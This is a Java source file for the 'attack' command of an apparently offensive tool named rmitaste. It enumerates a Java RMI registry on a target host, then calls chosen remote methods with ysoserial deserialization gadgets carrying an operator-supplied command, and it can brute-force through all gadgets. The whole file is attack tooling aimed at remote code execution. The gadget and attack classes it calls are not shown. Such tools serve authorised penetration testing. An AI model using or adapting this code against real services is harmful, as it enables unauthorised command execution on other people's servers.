package m0.rmitaste.commands;

import m0.helpers.CacheReader;
import m0.rmitaste.rmi.RmiRegistry;
import m0.rmitaste.rmi.exploit.Attack;
import m0.rmitaste.rmi.exploit.Enumerate;
import m0.rmitaste.rmi.payload.BasicGenerator;
import m0.rmitaste.rmi.payload.BruteforceGenerator;
import m0.rmitaste.rmi.payload.PayloadGenerator;
import picocli.CommandLine;

import java.io.File;
import java.io.FileNotFoundException;
import java.util.ArrayList;
import java.util.logging.Level;

/**
 * Interprets commandline parameters in attack mode and attacks specific RMI service
 *
 * @author Marcin Ogorzelski (mzero - @_mzer0)
 */
@CommandLine.Command(
        name="attack",
        description = "attacks RMI registry methods with gadgets from ysoserial"
)
public class AttackCommand extends BasicCommand{
    @CommandLine.Option(names={"-m", "--method"}, description = "name of remote method to attack in format: remoteObjectName:className:methodName . Use ':' as separator.", required = false)
    private String methodName = null;
    @CommandLine.Option(names={"-mf", "--method-file"}, description = "path to file that contains remote methods names to attack", required = false)
    private String methodNamesFile = null;
    @CommandLine.Option(names={"-c", "--cmd"}, description = "gadget command", required = true)
    private String payloadCmd = "";
    @CommandLine.Option(names={"-g", "--payload-name"}, description = "gadget name", required = false)
    private String payloadName = "";
    @CommandLine.Option(names={"-gen", "--payload-generator"}, description = "payload generator name. Supported generators: bruteforce, basic (default value). Bruteforce generator calls methods with all gadgets from ysoserial. Basic generator calls method with one specific gadget.", required = false)
    private String generator = "basic";

    public static void main(String[] args) {
        int exitCode = new CommandLine(new AttackCommand()).execute(args);
        System.exit(exitCode);
    }

    @Override
    public Integer call() throws Exception {
        // Setup logger
        this.initLogger();
        ArrayList<String> methodsList = new ArrayList<String>();
        PayloadGenerator payloadGenerator;
        try {
            // Connect and enumerate
            this.logger.info("Starting registry "+this.target + ":"+this.port+" enumeration...");
            Enumerate enumerate = new Enumerate(this.target, this.port);
            enumerate.enumerate();
            RmiRegistry rmiRegistry = enumerate.getRegistry();
            this.logger.info("Enumeration of "+this.target+":"+this.port+" has been completed. Information about "+rmiRegistry.getObjetcts().size()+" remote objects retrieved.");
            if(this.methodName != null){
                String methodToCall = this.target + ":" + this.port + ":"+ this.methodName;
                methodsList.add(methodToCall);
                this.logger.info("Method to attack: "+this.methodName);
            }

            if(this.methodNamesFile != null) {
                try {
                    File fileHandler = new File(this.methodNamesFile);
                    CacheReader cacheReader = new CacheReader(fileHandler);
                    cacheReader.open();
                    String line = cacheReader.read();
                    while (!(line == null)) {
                        methodsList.add(line);
                        this.logger.info("Method to attack: "+line);
                        line = cacheReader.read();
                    }
                    cacheReader.close();
                } catch (FileNotFoundException ex) {
                    this.logger.log(Level.SEVERE, "Could not find method list file " + this.methodNamesFile + ". Please, check if file path is correct. Shutting down...", ex);
                    return 1;
                }
            }

            if(this.generator.equals("bruteforce")){
                payloadGenerator = new BruteforceGenerator(this.payloadCmd);
                this.logger.info("Brute force mode has been set.");
                this.logger.info("Command to use in gadgets: "+this.payloadCmd);
            }else{
                payloadGenerator = new BasicGenerator(this.payloadName, this.payloadCmd);
                if(this.payloadName.isEmpty()){
                    System.out.println("You have to specify gadget name by using -g/--payload-name option.");
                    return 1;
                }
                this.logger.info("Command to use in "+this.payloadName+ "gadget: "+this.payloadCmd);
            }

            Attack attack = new Attack(rmiRegistry, payloadGenerator);
            attack.attackRegistry(methodsList);

        }catch(Throwable ex){
            System.out.println("Unknown error");
            logger.log(Level.SEVERE, "Unknown error: ", ex);
            System.exit(1);
        }
        return 0;
    }
}
